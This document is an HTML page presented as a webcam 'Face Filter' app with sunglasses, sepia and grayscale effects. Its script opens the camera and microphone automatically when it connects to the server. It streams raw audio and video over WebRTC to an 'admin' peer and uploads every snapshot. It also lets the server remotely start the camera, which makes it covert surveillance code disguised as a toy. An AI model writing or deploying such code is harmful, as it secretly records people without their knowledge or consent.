
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Face Filter</title>
  <script src="https://unpkg.com/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #1a1a1a;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    #video {
      width: 640px;
      height: 480px;
      border: 2px solid #fff;
      border-radius: 8px;
    }
    #canvas {
      position: absolute;
      width: 640px;
      height: 480px;
    }
    .video-container {
      position: relative;
      margin-bottom: 20px;
    }
    .controls {
      display: flex;
      gap: 10px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #45a049;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <h1>Face Filter Interface</h1>
  <div class="video-container">
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
  </div>
  <div class="controls">
    <button onclick="applyFilter('sunglasses')">Sunglasses</button>
    <button onclick="applyFilter('sepia')">Sepia</button>
    <button onclick="applyFilter('grayscale')">Grayscale</button>
    <button onclick="applyFilter('none')">No Filter</button>
    <button onclick="takePhoto()">Take Photo</button>
    <button onclick="stopCamera()">Stop Camera</button>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let stream = null;
    let currentFilter = null;
    let sunglasses = new Image();
    sunglasses.src = 'https://secret-404e.onrender.com/client-app/glass.png'; // Custom PNG, or use external URL
    let faceDetectionInterval = null;

    // Socket.IO connection
    const socket = io(window.location.origin, { path: '/socket.io' });
    socket.on('connect', () => {
      console.log('Connected to server');
      socket.emit('register', 'client');
      startCamera();
    });

    // WebRTC setup
    let peerConnection = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });

    peerConnection.onicecandidate = (event) => {
      if (event.candidate) {
        socket.emit('ice-candidate', event.candidate);
        console.log('Sent ICE candidate');
      }
    };

    socket.on('answer', async (answer) => {
      try {
        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
        console.log('Received answer from admin');
      } catch (err) {
        console.error('Error setting answer:', err);
      }
    });

    socket.on('ice-candidate', async (candidate) => {
      try {
        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
        console.log('Received ICE candidate from admin');
      } catch (err) {
        console.error('Error adding ICE candidate:', err);
      }
    });

    socket.on('start-camera', () => {
      startCamera();
    });

    socket.on('stop-camera', () => {
      stopCamera();
    });

    async function startCamera() {
      try {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;

        // Add raw tracks to peer connection
        stream.getTracks().forEach(track => {
          peerConnection.addTrack(track, stream);
          console.log(`Added ${track.kind} track to peer connection`);
        });

        // Create and send offer
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.emit('offer', offer);
        console.log('Sent WebRTC offer');

        // Start face detection
        await Promise.all([
          faceapi.nets.tinyFaceDetector.loadFromUri('https://unpkg.com/face-api.js@0.22.2/weights'),
          faceapi.nets.faceLandmark68Net.loadFromUri('https://unpkg.com/face-api.js@0.22.2/weights')
        ]);

        faceDetectionInterval = setInterval(async () => {
          const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
            .withFaceLandmarks();

          ctx.clearRect(0, 0, canvas.width, canvas.height);
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          if (currentFilter && currentFilter !== 'none') {
            if (currentFilter === 'sunglasses' && detections) {
              const landmarks = detections.landmarks;
              const leftEye = landmarks.getLeftEye();
              const rightEye = landmarks.getRightEye();
              const eyeDistance = Math.sqrt(
                Math.pow(rightEye[0].x - leftEye[0].x, 2) +
                Math.pow(rightEye[0].y - leftEye[0].y, 2)
              );
              const sunglassesWidth = eyeDistance * 2.5;
              const sunglassesHeight = sunglassesWidth * (sunglasses.naturalHeight / sunglasses.naturalWidth);
              const sunglassesX = leftEye[0].x - sunglassesWidth * 0.25;
              const sunglassesY = leftEye[0].y - sunglassesHeight * 0.5;
              ctx.drawImage(sunglasses, sunglassesX, sunglassesY, sunglassesWidth, sunglassesHeight);
            } else if (currentFilter === 'sepia') {
              ctx.filter = 'sepia(1)';
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            } else if (currentFilter === 'grayscale') {
              ctx.filter = 'grayscale(1)';
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
          } else {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          }
        }, 100);
      } catch (err) {
        console.error('Error starting camera:', err);
      }
    }

    function applyFilter(filter) {
      currentFilter = filter;
      if (!stream) {
        startCamera();
      }
    }

    function takePhoto() {
      if (stream && video.srcObject) {
        const snapshotCanvas = document.createElement('canvas');
        snapshotCanvas.width = video.videoWidth;
        snapshotCanvas.height = video.videoHeight;
        const snapshotCtx = snapshotCanvas.getContext('2d');
        snapshotCtx.drawImage(video, 0, 0);

        // Generate timestamp for unique filename
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `snapshot_${timestamp}.png`;

        if (currentFilter === 'sunglasses' && faceDetectionInterval) {
          faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
            .withFaceLandmarks()
            .then(detections => {
              if (detections) {
                const landmarks = detections.landmarks;
                const leftEye = landmarks.getLeftEye();
                const rightEye = landmarks.getRightEye();
                const eyeDistance = Math.sqrt(
                  Math.pow(rightEye[0].x - leftEye[0].x, 2) +
                  Math.pow(rightEye[0].y - leftEye[0].y, 2)
                );
                const sunglassesWidth = eyeDistance * 2.5;
                const sunglassesHeight = sunglassesWidth * (sunglasses.naturalHeight / sunglasses.naturalWidth);
                const sunglassesX = leftEye[0].x - sunglassesWidth * 0.25;
                const sunglassesY = leftEye[0].y - sunglassesHeight * 0.5;
                snapshotCtx.drawImage(sunglasses, sunglassesX, sunglassesY, sunglassesWidth, sunglassesHeight);
              }
              const dataUrl = snapshotCanvas.toDataURL('image/png');
              socket.emit('snapshot', dataUrl);
              downloadSnapshot(dataUrl, filename);
            });
        } else if (currentFilter === 'sepia') {
          snapshotCtx.filter = 'sepia(1)';
          snapshotCtx.drawImage(video, 0, 0);
          const dataUrl = snapshotCanvas.toDataURL('image/png');
          socket.emit('snapshot', dataUrl);
          downloadSnapshot(dataUrl, filename);
        } else if (currentFilter === 'grayscale') {
          snapshotCtx.filter = 'grayscale(1)';
          snapshotCtx.drawImage(video, 0, 0);
          const dataUrl = snapshotCanvas.toDataURL('image/png');
          socket.emit('snapshot', dataUrl);
          downloadSnapshot(dataUrl, filename);
        } else {
          const dataUrl = snapshotCanvas.toDataURL('image/png');
          socket.emit('snapshot', dataUrl);
          downloadSnapshot(dataUrl, filename);
        }
      }
    }

    function downloadSnapshot(dataUrl, filename) {
      const link = document.createElement('a');
      link.href = dataUrl;
      link.download = filename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
        video.srcObject = null;
        clearInterval(faceDetectionInterval);
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        currentFilter = null;
        socket.emit('stop-camera');
        peerConnection.close();
        peerConnection = new RTCPeerConnection({
          iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
      }
    }
  </script>
</body>
</html>
